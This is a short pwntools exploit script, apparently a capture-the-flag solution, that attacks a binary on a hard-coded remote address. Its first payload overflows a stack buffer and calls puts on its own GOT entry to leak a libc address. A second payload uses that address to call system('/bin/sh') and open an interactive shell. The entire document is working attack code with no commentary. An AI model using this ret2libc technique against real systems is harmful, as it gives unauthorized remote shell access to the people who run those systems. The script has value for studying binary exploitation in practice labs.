from pwn import *

context(os='linux',arch='amd64',log_level='debug')

#io=process('./pwn')
io=connect('47.97.58.52',42003)
elf=ELF('./pwn')
libc=ELF('./libc.so.6')

pp=elf.plt['puts']
pg=elf.got['puts']

rdi=0x4012c3

va=0x401205#vuln()

pl=b'a'*(0x20+8)#payload
pl+=p64(rdi)
pl+=p64(pg)
pl+=p64(pp)
pl+=p64(va)#ret2

io.sendlineafter('libc ?',pl)

io.recvline()
pr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))#puts real
print(hex(pr))

lb=pr-libc.sym['puts']#libc base
sa=lb+libc.sym['system']#system addr
ba=lb+libc.search('/bin/sh').__next__()

fpl=b'a'*(0x20+8)#final payload
fpl+=p64(rdi)
fpl+=p64(ba)
fpl+=p64(0x401235)#ret addr
fpl+=p64(sa)
fpl+=p64(va)#fake ret

io.sendlineafter('libc ?',fpl)

io.interactive()
